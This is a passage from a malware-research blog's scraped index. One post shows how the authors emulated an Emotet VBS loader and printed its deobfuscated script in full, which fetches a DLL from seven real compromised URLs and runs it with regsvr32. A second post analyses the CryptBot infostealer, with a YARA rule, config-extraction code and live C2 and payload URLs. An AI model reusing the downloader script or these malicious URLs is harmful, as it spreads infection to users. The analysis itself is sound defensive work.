Dumpulotor rtEval bp is hit it means that another script is attempting to execute (pointed to by ECX) | . We still ran into a few issues but managed to work passed them... . Dumpulator (Unicorn) AVX Support . There is no support for AVX in Unicorn so we had to use a VM with AVX instructions disabled to take our dump for Dumpulator. . Syscalls!! . Inside of the rtEval function the AMSI functions are called which in turn call into the Defender DLL. This causes all kinds of Syscall activity that we don&#39;t want to implement in Dumpulator so our solution was to just NOP out the AMSI calls. (Image and implementation courtesy of @mishap) . . Dumpulator Alloc Bug? . There was some sort of issue with page alignment in dumpulator&#39;s memory manager so we just forced it in ZwAllocateVirtualMemory. . base = round_to_pages(base) . This will be opened as as a proper issue... . Limitations . This is just a proof of concept. . We only handle the execute method from VBS other execution methods may need additional hooks | We also don&#39;t handle any actual script execution (ie. calls to Windows APIs from the script) | We only deobfuscate the first layer then end | Currently we don&#39;t exit cleanly at the end of the script (it runs till failure) | . Script Prep . Because we are effectively treating our target script as through it was a script passed to the execute command as a string it must be encoded as UTF-16 and it cannot contain any comments. . script = open(&#39;/tmp/bad.vbs&#39;,&#39;rb&#39;).read() out = b&#39;&#39; for c in script.split(b&#39; n&#39;): if c[0] == ord(b&quot;&#39;&quot;): continue out += c + b&#39; n&#39; tmp_bytes = [] for c in out: tmp_bytes.append(c) tmp_bytes.append(0) script_bytes = bytes(tmp_bytes) + b&#39; x00 x00&#39; . Dumpulator Run . from dataclasses import dataclass from typing import Callable, Dict, Union, Optional from dumpulator import Dumpulator from dumpulator.dumpulator import ExceptionInfo, ExceptionType seen = False @dataclass class BreakpointInfo: address: int original: bytes callback: Callable[[], None] class MyDumpulator(Dumpulator): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) self._breakpoints: Dict[int, BreakpointInfo] = {} self._breakpoint_step: Optional[BreakpointInfo] = None self.set_exception_hook(self.exception_hook) def set_breakpoint(self, address: Union[int, str], callback: Callable[[], None]): if isinstance(address, str): module_name, export_name = address.split(&quot;:&quot;) module = self.modules.find(module_name) if module is None: raise KeyError(f&quot;Module &#39;{module_name}&#39; not found&quot;) export = module.find_export(export_name) if export is None: raise KeyError(f&quot;Export &#39;{export_name}&#39; not found in module &#39;{module_name}&#39;&quot;) assert export.forward is None address: int = export.address assert address not in self._breakpoints self._breakpoints[address] = BreakpointInfo(address, self.read(address, 1), callback) self.write(address, b&quot; xCC&quot;) def remove_breakpoint(self, address: int): assert address in self._breakpoints bp = self._breakpoints[address] self.write(bp.address, bp.original) del self._breakpoints[address] def exception_hook(self, exception: ExceptionInfo) -&gt; Optional[int]: if exception.type == ExceptionType.Interrupt: if exception.interrupt_number == 3: # int3 # Find the breakpoint bp = self._breakpoints.get(self.regs.cip - 1) if bp is None: print(f&quot;Unexpected int3 at {hex(self.regs.cip)}, ignoring&quot;) return None print(f&quot;Reached breakpoint at {hex(bp.address)}&quot;) # Execute the breakpoint callback self.regs.cip -= 1 bp.callback() # Restore the breakpoint if it wasn&#39;t removed if bp.address in self._breakpoints: print(&#39;Restoring breakpoint&#39;) self.write(bp.address, bp.original) self.regs.eflags |= 0x100 # trap flag self._breakpoint_step = bp # Resume execution at the CIP (the callback might change it) return self.regs.cip elif exception.interrupt_number == 1: # single step if self._breakpoint_step is None: print(f&quot;Unexpected single step at {hex(self.regs.cip)}&quot;) return None print(&quot;Single stepping after breakpoint&quot;) self.regs.eflags &amp;= ~0x100 # remove trap flag self.write(self._breakpoint_step.address, b&quot; xCC&quot;) self._breakpoint_step = None return self.regs.cip # Let the original exception handler do this return None @syscall def ZwAllocateVirtualMemory(dp: Dumpulator, ProcessHandle: Annotated[HANDLE, SAL(&quot;_In_&quot;)], BaseAddress: Annotated[P[PVOID], SAL(&quot;_Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize))&quot;)], ZeroBits: Annotated[ULONG_PTR, SAL(&quot;_In_&quot;)], RegionSize: Annotated[P[SIZE_T], SAL(&quot;_Inout_&quot;)], AllocationType: Annotated[ULONG, SAL(&quot;_In_&quot;)], Protect: Annotated[ULONG, SAL(&quot;_In_&quot;)] ): assert ZeroBits == 0 assert ProcessHandle == dp.NtCurrentProcess() base = dp.read_ptr(BaseAddress.ptr) base = round_to_pages(base) assert base &amp; 0xFFF == 0 size = round_to_pages(dp.read_ptr(RegionSize.ptr)) #assert size != 0 protect = MemoryProtect(Protect) if AllocationType == MEM_COMMIT: if base == 0: base = dp.memory.find_free(size) dp.memory.reserve(base, size, protect) BaseAddress.write_ptr(base) RegionSize.write_ptr(size) #print(f&quot;commit({hex(base)}[{hex(size)}], {protect})&quot;) dp.memory.commit(base, size, protect) elif AllocationType == MEM_RESERVE: if base == 0: base = dp.memory.find_free(size) BaseAddress.write_ptr(base) RegionSize.write_ptr(size) #print(f&quot;reserve({hex(base)}[{hex(size)}], {protect})&quot;) dp.memory.reserve(base, size, protect) elif AllocationType == MEM_COMMIT | MEM_RESERVE: if base == 0: base = dp.memory.find_free(size) BaseAddress.write_ptr(base) RegionSize.write_ptr(size) #print(f&quot;reserve+commit({hex(base)}[{hex(size)}], {protect})&quot;) dp.memory.reserve(base, size, protect) dp.memory.commit(base, size) else: raise NotImplementedError() return STATUS_SUCCESS dp = MyDumpulator(&quot;/tmp/cscript_nopped.dmp&quot;, quiet=True) def rteval_bp(): global seen print(&quot;hit bp&quot;) #print(dp.read_str(dp.regs.ecx, encoding=&#39;utf-16&#39;)) if seen: print(seen) out = b&#39;&#39; ptr = dp.regs.ecx c = 0 while c &lt; 100000000: c += 1 ptr_byte = dp.read(ptr, 1) out += ptr_byte if ptr_byte == b&#39; x00&#39;: if dp.read(ptr+1, 1) == b&#39; x00&#39;: break ptr += 1 print(&quot;== SCRIPT ==&quot;) print(out.decode(&#39;utf-16&#39;).replace(&#39; r&#39;,&#39; n&#39;)) dp.remove_breakpoint(0x7021074D) dp.eip = 0x13371337 dp.stop() else: print(seen) seen = True dp.set_breakpoint(0x7021074D, rteval_bp) ptr_script_bytes = dp.allocate(len(script_bytes),page_align = True) dp.write(ptr_script_bytes, script_bytes) dp.regs.ecx = ptr_script_bytes dp.write(dp.regs.ecx, script_bytes) dp.start(dp.regs.cip, end=0x13371337) . interrupt 3 (#BP, Breakpoint), cip = 0x7021074e, cs = 0x23 Reached breakpoint at 0x7021074d hit bp False Restoring breakpoint interrupt 1 (#DB, Debug), cip = 0x7021074f, cs = 0x23 Single stepping after breakpoint interrupt 3 (#BP, Breakpoint), cip = 0x7021074e, cs = 0x23 Reached breakpoint at 0x7021074d hit bp True == SCRIPT == urlcount=1 set fsobject=createobject(&#34;scripting.filesystemobject&#34;) currentdir=fsobject.getparentfoldername(wscript.scriptfullname) set request=createobject(&#34;winhttp.winhttprequest.5.1&#34;) set file=wscript.createobject(&#34;shell.application&#34;) set strout=createobject(&#34;adodb.stream&#34;) useragent=&#34;mozilla/5.0 (windows nt 6.1; wow64; rv:58.0) gecko/20100101 firefox/58.0&#34; ouch= chr(115-1)+&#34;e&#34;+&#34;gs&#34;&amp;&#34;v&#34;+chr(113+1)+&#34;3&#34;+&#34;2.&#34;+chr(101)+&#34;x&#34;+chr(101)+&#34; &#34; + &#34;&#34; pat3= currentdir+&#34; &#34;+fsobject.gettempname+&#34;.dll&#34; loiu=ouch+ &#34;&#34;&#34;&#34;+ pat3 + &#34;&#34;&#34;&#34; set triplett=createobject(&#34;wscript.shell&#34;) url1 = &#34;https://penshorn.org/admin/Ses8712iGR8du/&#34; url2 = &#34;https://bbvoyage.com/useragreement/ElKHvb4QIQqSrh6Hqm/&#34; url3 = &#34;https://www.gomespontes.com.br/logs/pd/&#34; url4 = &#34;https://portalevolucao.com/GerarBoleto/fLIOoFbFs1jHtX/&#34; url5 = &#34;http://ozmeydan.com/cekici/9/&#34; url6 = &#34;http://softwareulike.com/cWIYxWMPkK/&#34; url7 = &#34;http://wrappixels.com/wp-admin/GdIA2oOQEiO5G/&#34; do call dow loop while urlcount&lt;8 public function dow() on error resume next select case urlcount case 1 downstr=url1 case 2 downstr=url2 case 3 downstr=url3 case 4 downstr=url4 case 5 downstr=url5 case 6 downstr=url6 case 7 downstr=url7 end select request.open &#34;get&#34;,downstr,false request.send If Err.Number&lt;&gt;0 then urlcount=urlcount+1 else strout.open strout.type=1 if vare=0 then cad=1 else far=2 end if strout.write (request.responsebody) if roum=0 then sio=sio+1 else end if strout.savetofile pat3 strout.close armour = &#34;samcom.&#34; set fsobject=createobject(&#34;scripting.filesystemobject&#34;) Set f = fsobject.GetFile(pat3) GetFileSize = clng(f.size/1024) If GetFileSize &gt; 150 Then call roize urlcount = 8 else pat3= currentdir+&#34; &#34;+fsobject.gettempname+&#34;.dll&#34; loiu=ouch+ &#34;&#34;&#34;&#34;+ pat3 + &#34;&#34;&#34;&#34; urlcount=urlcount+1 end if end if end function public function roize if derti=0 then sem=sem+1 else end if urlcount = 8 triplett.run (loiu),0,true cor = &#34;samo&#34; set fsobject=createobject(&#34;scripting.filesystemobject&#34;) set textstream = fsobject.createtextfile(&#34;&#34;+wscript.scriptfullname+&#34;&#34;) textstream.write (&#34;badum tss&#34;) if rotate = 12 then sable = 54 + 22 else routtt = &#34;carry&#34; end if end function interrupt 3 (#BP, Breakpoint), cip = 0x7021074e, cs = 0x23 Unexpected int3 at 0x7021074e, ignoring Exception thrown during syscall implementation, stopping emulation! forced exit memory operation 21 of 0x4fe2[0x1] = 0x0 . NotImplementedError Traceback (most recent call last) &lt;ipython-input-8-cb4a538155d4&gt; in &lt;module&gt; 170 171 --&gt; 172 dp.start(dp.regs.cip, end=0x13371337) 173 174 ~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py in start(self, begin, end, count) 1110 except UcError as err: 1111 if self.kill_me is not None and type(self.kill_me) is not UcError: -&gt; 1112 raise self.kill_me 1113 if self._exception.type != ExceptionType.NoException: 1114 # Handle the exception outside of the except handler ~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/unicorn/unicorn.py in wrapper(self, *args, **kwargs) 390 &#34;&#34;&#34; 391 try: --&gt; 392 return func(self, *args, **kwargs) 393 except Exception as e: 394 # If multiple hooks raise exceptions, just use the first one ~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/unicorn/unicorn.py in _hook_insn_syscall_cb(self, handle, user_data) 713 # call user&#39;s callback with self object 714 (cb, data) = self._callbacks[user_data] --&gt; 715 cb(self, data) 716 717 @_catch_hook_exception ~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py in _hook_syscall(uc, dp) 1619 except Exception as exc: 1620 dp.error(f&#34;Exception thrown during syscall implementation, stopping emulation!&#34;) -&gt; 1621 raise dp.raise_kill(exc) from None 1622 finally: 1623 dp.sequence_id += 1 ~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py in _hook_syscall(uc, dp) 1601 dp.info(&#34;)&#34;) 1602 try: -&gt; 1603 status = syscall_impl(dp, *args) 1604 if isinstance(status, ExceptionInfo): 1605 print(&#34;context switch, stopping emulation&#34;) ~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/ntsyscalls.py in ZwQueryInformationJobObject(dp, JobHandle, JobObjectInformationClass, JobObjectInformation, JobObjectInformationLength, ReturnLength) 2972 ReturnLength: Annotated[P[ULONG], SAL(&#34;_Out_opt_&#34;)] 2973 ): -&gt; 2974 raise NotImplementedError() 2975 2976 @syscall NotImplementedError: .",
            "url": "https://research.openanalysis.net/onenote/emotet/wsf/triage/2023/03/19/onenote.html",
            "relUrl": "/onenote/emotet/wsf/triage/2023/03/19/onenote.html",
            "date": " ‚Ä¢ Mar 19, 2023"
        }
        
    
  
    
        ,"post16": {
            "title": "CryptBot",
            "content": "Overview . This is another C++ bot! According to Malpedia... . A typical infostealer, capable of obtaining credentials for browsers, crypto currency wallets, browser cookies, credit cards, and creates screenshots of the infected system. All stolen data is bundled into a zip-file that is uploaded to the c2. . Samples . Samples available on UnpacMe- Packed 7ccda59528c0151bc9f11b7f25f8291d99bcf541488c009ef14e2a104e6f0c5d . Unpacked cfbecf45c083efffff6d3000972a66cddb2f26d5c1845a697351b132e65049e0 | . References . 40,000 CryptBot Downloads per Day: Bitbucket Abused as Malware Slinger | CryptBot Infostealer: Malware Analysis | . Analysis . This is a some in-memory string that was captured in a joe sandbox run . Content-Length: Content-Type: multipart/form-data;boundary=httphttpstrue&lt;&gt;S-1-5-18[&lt;apis.google.com&gt;]/[&lt;443&gt;][&lt;www.google.com&gt;][&lt;&quot;facebook&quot;&gt;][&lt;www.facebook.com&gt;][&lt;TEMP&gt;][&lt;APPDATA&gt;][&lt;LOCALAPPDATA&gt;][&lt;USERPROFILE&gt;];[&lt;ExternalDownload&gt;][&lt;Anti&gt;][&lt;true&gt;][&lt;UserAgent&gt;][&lt;UAC&gt;]runas[&lt;NTFS&gt;][&lt;Prefix&gt;][&lt;UID: &gt;][&lt;UserName: &gt;][&lt;ComputerName: &gt;][&lt;Info&gt;][&lt;OS: &gt;][&lt;DateTime: &gt;][&lt;UserAgent: &gt;][&lt;Keyboard Languages: &gt;][&lt;Display Resolution: &gt;][&lt;CPU: &gt;][&lt;RAM: &gt;][&lt;GPU: &gt;][&lt;isGodMod: yes&gt;][&lt;isGodMod: no&gt;][&lt;isAdmin: yes&gt;][&lt;isAdmin: no&gt;][&lt;Installed software:&gt;][&lt;Disk:&gt;][&lt;Process:&gt;][&lt;Screenshot&gt;][&lt;InfoFile&gt;][&lt;ScreenFile&gt;][&lt;PasswordFile&gt;][&lt;ChromeDBFolder&gt;][&lt;ChromeExt&gt;][&lt;WalletFolder&gt;][&lt;_Chrome_profile&gt;][&lt;EdgeDB&gt;][&lt;EdgeDBFolder&gt;][&lt;EdgeExt&gt;][&lt;_Edge_profile&gt;][&lt;Desktop&gt;][&lt;DesktopFolder&gt;][&lt;.txt&gt;][&lt;Wallet&gt;]_test.err://[&lt;80&gt;][&lt;OK&gt;][&lt; /c &gt;][&lt;cmd&gt;][&lt;open&gt;][&lt;MessageAfterEnd&gt;][&lt;System Error&gt;][&lt;The application was unable to start correctly (0xc000007b). Click OK to close the application.&gt;][&lt;DeleteAfterEnd&gt;][&lt; /c timeout -t 5 &amp;&amp; del &quot;&gt;] . Yara Rule . Some of these strings exist in the binary unencrypted so we can use them for a yara rule . rule cryptbot { strings: $s1 = &quot;UID:&quot; $s2 = &quot;UserName:&quot; $s3 = &quot;ComputerName:&quot; $s4 = &quot;DateTime:&quot; $s5 = &quot;UserAgent:&quot; $s6 = &quot;Keyboard Languages:&quot; $s7 = &quot;Display Resolution:&quot; $s8 = &quot;CPU:&quot; $s9 = &quot;RAM:&quot; $s10 = &quot;GPU:&quot; $s11 = &quot;isGodMod: yes&quot; $s12 = &quot;isGodMod: no&quot; $s13 = &quot;isAdmin: yes&quot; $s14 = &quot;isAdmin: no&quot; $s15 = &quot;Installed software:&quot; condition: all of them } . Config . Finding a ref to the config in the code. . 80 3D ?? ?? ?? ?? 09 cmp byte ptr ptr_config, 9 ; &quot;PSJigdSdi8&quot; B9 00 01 00 00 mov ecx, 100h . B9 00 01 00 00 mov ecx, 100h 80 3D ?? ?? ?? ?? 09 cmp byte ptr a7m1fqxrljy, 9 ; &quot;7m1fqXrLJy&quot; . import re import pefile import struct file_data = open(&#39;/tmp/cryptbot.bin&#39;, &#39;rb&#39;).read() pe = pefile.PE(data = file_data) image_base = pe.OPTIONAL_HEADER.ImageBase text_data = None for s in pe.sections: if b&#39;.text&#39; == s.Name[:5]: text_data = s.get_data() break assert text_data is not None eggs = [ rb&#39; x80 x3D(....) x09 xB9 x00 x01 x00 x00&#39;, rb&#39; xB9 x00 x01 x00 x00 x80 x3D(....) x09&#39; ] candidate_offsets = [] for egg in eggs: for m in re.finditer(egg, text_data, re.DOTALL): try: candidate_va = struct.unpack(&#39;&lt;I&#39;, m.group(1))[0] candidate_offset = pe.get_offset_from_rva(candidate_va - image_base) candidate_offsets.append(candidate_offset) except: print(f&quot;failed for group {m.group(1)}&quot;) pass . def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i % len(key)]) return bytes(out) def get_config(data, offset): key = data[offset:].split(b&#39; x00&#39;)[0] assert 5 &lt; len(key) &lt; 20 config_data_enc = data[offset + len(key) + 1:] return xor_decrypt(config_data_enc, key) config_data = None for candidate_offset in candidate_offsets: try: tmp_config = get_config(file_data, candidate_offset) if tmp_config[:4] == b&#39;http&#39;: config_data = tmp_config break except: pass assert config_data is not None # config parse config_array = [] for a in config_data.split(b&#39; x00&#39;): if not a.isascii(): break config_array.append(a) c2 = config_array[0].decode(&#39;utf-8&#39;) settings = [] for config_entries in config_array[1:]: for entry in config_entries.split(b&#39;&lt;&gt; r n&#39;): if len(entry) == 0: continue settings.append({&#39;key&#39;:entry.split(b&#39;&lt;&gt;_&lt;&gt;&#39;)[0].decode(&#39;utf-8&#39;), &#39;value&#39;:entry.split(b&#39;&lt;&gt;_&lt;&gt;&#39;)[1].decode(&#39;utf-8&#39;)}) print(c2) print(settings) . http://erniku42.top/gate.php; [{&#39;key&#39;: &#39;CookiesEdge&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;HistoryEdge&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;HistoryFirefox&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;EdgeDB&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Edge&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Files&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Opera&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;CookiesOpera&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;HistoryOpera&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Screenshot&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Chrome&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Info&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;HistoryChrome&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;ChromeDB&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Wallet&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;ChromeExt&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Firefox&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;CookiesChrome&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;FirefoxDB&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;CookiesFirefox&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Desktop&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;EdgeExt&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;CookiesFile&#39;, &#39;value&#39;: &#39;_AllCookies.txt&#39;}, {&#39;key&#39;: &#39;HistoryFile&#39;, &#39;value&#39;: &#39;_AllHistory.txt&#39;}, {&#39;key&#39;: &#39;NTFS&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Key&#39;, &#39;value&#39;: &#39;NkB7vazOVtAR2LZ&#39;}, {&#39;key&#39;: &#39;DesktopFolder&#39;, &#39;value&#39;: &#39;_Desktop&#39;}, {&#39;key&#39;: &#39;UAC&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;ScreenFile&#39;, &#39;value&#39;: &#39;$CREEN.PNG&#39;}, {&#39;key&#39;: &#39;DeleteAfterEnd&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;MessageAfterEnd&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;FirefoxDBFolder&#39;, &#39;value&#39;: &#39;_Firefox&#39;}, {&#39;key&#39;: &#39;Anti&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;EdgeDBFolder&#39;, &#39;value&#39;: &#39;_Edge&#39;}, {&#39;key&#39;: &#39;UserAgent&#39;, &#39;value&#39;: &#39;&#39;}, {&#39;key&#39;: &#39;Prefix&#39;, &#39;value&#39;: &#39;mrd-&#39;}, {&#39;key&#39;: &#39;WalletFolder&#39;, &#39;value&#39;: &#39;_Wallet&#39;}, {&#39;key&#39;: &#39;PasswordFile&#39;, &#39;value&#39;: &#39;_AllPasswords.txt&#39;}, {&#39;key&#39;: &#39;ChromeDBFolder&#39;, &#39;value&#39;: &#39;_Chrome&#39;}, {&#39;key&#39;: &#39;ExternalDownload&#39;, &#39;value&#39;: &#39;http://ovapfa05.top/unfele.dat&#39;}, {&#39;key&#39;: &#39;FilesFolder&#39;, &#39;value&#39;: &#39;_Files&#39;}, {&#39;key&#39;: &#39;InfoFile&#39;, &#39;value&#39;: &#39;_Information.txt&#39;}] . def get_config_from_file(file_path): file_data = open(file_path, &#39;rb&#39;).read() pe = pefile.PE(data = file_data) image_base = pe.OPTIONAL_HEADER.ImageBase text_data = None for s in pe.sections: if b&#39;.text&#39; == s.Name[:5]: text_data = s.get_data() break assert text_data is not None eggs = [ rb&#39; x80 x3D(....) x09 xB9 x00 x01 x00 x00&#39;, rb&#39; xB9 x00 x01 x00 x00 x80 x3D(....) x09&#39; ] candidate_offsets = [] for egg in eggs: for m in re.finditer(egg, text_data, re.DOTALL): try: candidate_va = struct.unpack(&#39;&lt;I&#39;, m.group(1))[0] candidate_offset = pe.get_offset_from_rva(candidate_va - image_base) candidate_offsets.append(candidate_offset) except: print(f&quot;failed for group {m.group(1)}&quot;) pass assert len(candidate_offsets) != 0 config_data = None for candidate_offset in candidate_offsets: try: tmp_config = get_config(file_data, candidate_offset) if tmp_config[:4] == b&#39;http&#39;: config_data = tmp_config break except: pass assert config_data is not None # config parse config_array = [] for a in config_data.split(b&#39; x00&#39;): if not a.isascii(): break config_array.append(a) c2 = config_array[0].decode(&#39;utf-8&#39;) settings = [] for config_entries in config_array[1:]: for entry in config_entries.split(b&#39;&lt;&gt; r n&#39;): if len(entry) == 0: continue settings.append({&#39;key&#39;:entry.split(b&#39;&lt;&gt;_&lt;&gt;&#39;)[0].decode(&#39;utf-8&#39;), &#39;value&#39;:entry.split(b&#39;&lt;&gt;_&lt;&gt;&#39;)[1].decode(&#39;utf-8&#39;)}) assert len(settings) != 0 final_config = {&#39;c2&#39;:c2, &#39;settings&#39;:settings} return final_config get_config_from_file(&#39;/tmp/cryptbot.bin&#39;) . {&#39;c2&#39;: &#39;http://erniku42.top/gate.php;&#39;, &#39;settings&#39;: [{&#39;key&#39;: &#39;CookiesEdge&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;HistoryEdge&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;HistoryFirefox&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;EdgeDB&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Edge&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Files&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Opera&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;CookiesOpera&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;HistoryOpera&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Screenshot&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Chrome&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Info&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;HistoryChrome&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;ChromeDB&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Wallet&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;ChromeExt&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Firefox&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;CookiesChrome&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;FirefoxDB&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;CookiesFirefox&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;Desktop&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;EdgeExt&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;CookiesFile&#39;, &#39;value&#39;: &#39;_AllCookies.txt&#39;}, {&#39;key&#39;: &#39;HistoryFile&#39;, &#39;value&#39;: &#39;_AllHistory.txt&#39;}, {&#39;key&#39;: &#39;NTFS&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;Key&#39;, &#39;value&#39;: &#39;NkB7vazOVtAR2LZ&#39;}, {&#39;key&#39;: &#39;DesktopFolder&#39;, &#39;value&#39;: &#39;_Desktop&#39;}, {&#39;key&#39;: &#39;UAC&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;ScreenFile&#39;, &#39;value&#39;: &#39;$CREEN.PNG&#39;}, {&#39;key&#39;: &#39;DeleteAfterEnd&#39;, &#39;value&#39;: &#39;true&#39;}, {&#39;key&#39;: &#39;MessageAfterEnd&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;FirefoxDBFolder&#39;, &#39;value&#39;: &#39;_Firefox&#39;}, {&#39;key&#39;: &#39;Anti&#39;, &#39;value&#39;: &#39;false&#39;}, {&#39;key&#39;: &#39;EdgeDBFolder&#39;, &#39;value&#39;: &#39;_Edge&#39;}, {&#39;key&#39;: &#39;UserAgent&#39;, &#39;value&#39;: &#39;&#39;}, {&#39;key&#39;: &#39;Prefix&#39;, &#39;value&#39;: &#39;mrd-&#39;}, {&#39;key&#39;: &#39;WalletFolder&#39;, &#39;value&#39;: &#39;_Wallet&#39;}, {&#39;key&#39;: &#39;PasswordFile&#39;, &#39;value&#39;: &#39;_AllPasswords.txt&#39;}, {&#39;key&#39;: &#39;ChromeDBFolder&#39;, &#39;value&#39;: &#39;_Chrome&#39;}, {&#39;key&#39;: &#39;ExternalDownload&#39;, &#39;value&#39;: &#39;http://ovapfa05.top/unfele.dat&#39;}, {&#39;key&#39;: &#39;FilesFolder&#39;, &#39;value&#39;: &#39;_Files&#39;}, {&#39;key&#39;: &#39;InfoFile&#39;, &#39;value&#39;: &#39;_Information.txt&#39;}]} . from pathlib import Path for file in Path(&#39;/tmp/samples/&#39;).glob(&#39;*&#39;): print(file) try: config = get_config_from_file(file) print(config.get(&#39;c2&#39;), &#39;None&#39;) except Exception as e: print(&quot;ERROR&quot;) print(e) . /tmp/samples/909ce699e4a2680687b65ca3d4ff8cd24a410c05ceda581741e17aa429b12983 http://ernjxs12.top/gate.php; None /tmp/samples/c20a40b230e26207a392fc196ecf818cd41c400aff19cd124bcb6a831ea5c1b9 ERROR /tmp/samples/f8675c4a0fa94fb4d0bf070bc171ddfd732143bf1fba1847c537ef43ea00f6a6 http://ewzpak62.top/gate.php; None /tmp/samples/de9216d23a71a911d38028743d3d7af93da2e29774601cd96a4bf8ead842058f http://lahwsg62.top/gate.php; None /tmp/samples/4aee291fc52bf99bf92331c7c6eeedc87d5c2e7a00291af522a6e2249794cf76 http://lahrom42.top/gate.php; None /tmp/samples/bcbbba94fb3901541a97a0cf5c95209cf4520eb9d731691ce28e7995459b8eac http://xjuxjt32.top/gate.php; None /tmp/samples/c6338e4242cf07ce63beb69365c79b6101cbde5e6101a04d4398b2433ac20786 http://olsodv72.top/gate.php; None /tmp/samples/004b0ef1531d232cd379ade9a64548618ea5652c9b3c6adf8fd9614a6b64d752 ERROR /tmp/samples/addc404a3575d31882a52539d77c379c2efd6bd7d3c9adde1cf0480b128cd8ad ERROR /tmp/samples/c7348d5113889d4527e6f2deab6620ad36c6fa693aff1f604d12338f6fc57e54 http://ewzsvl72.top/gate.php; None /tmp/samples/b35d7d4f1396708cb3ab73b44676a59b093e0992c3d41615bdc618239d356389 ERROR /tmp/samples/50b3f06b47de1c90b02c2866286e980a2e69349388de986f2cba9c208419c1df ERROR /tmp/samples/4b62e5a44c931decf395e9d50f4c8a5493fc15c1192292b80ff46b959255c84a http://xjuoso62.top/gate.php; None /tmp/samples/a13f4d7f199437414060bb981904506d51d2b9498e9d30d74fc04a993088ebbf ERROR /tmp/samples/8ac5b6f4cfed8d1d089cf3c5a2fd634652cdf6193411cad2b25d65914f833066 ERROR /tmp/samples/00f18e515f076e1b327e90ff4eebe344b1bb4e30ac362700004b5bbc681783f7 ERROR /tmp/samples/371aa5cf136719c2056ea54cc0e748809e6db74a949f3d861e0d436942e6a6e2 ERROR /tmp/samples/eeded5f5d006dacd9e2f33ba9fad47332c04b57f621c89731376f51127198345 http://trenio65.top/gate.php; None /tmp/samples/b42db646291fffc82f030f7bab50c2ecb452a51682fa5c4227f39d4dbc9124e3 http://lahlra52.top/gate.php; None /tmp/samples/c56043cbaedc47339c3d9e9b9fa96097665051ec4d9e9bfe1db461f52706b1bc ERROR /tmp/samples/74fa24b3334856b2828bcfd21d0529a00af8a42fa23447e1080f450852595efd http://lahmkf22.top/gate.php; None 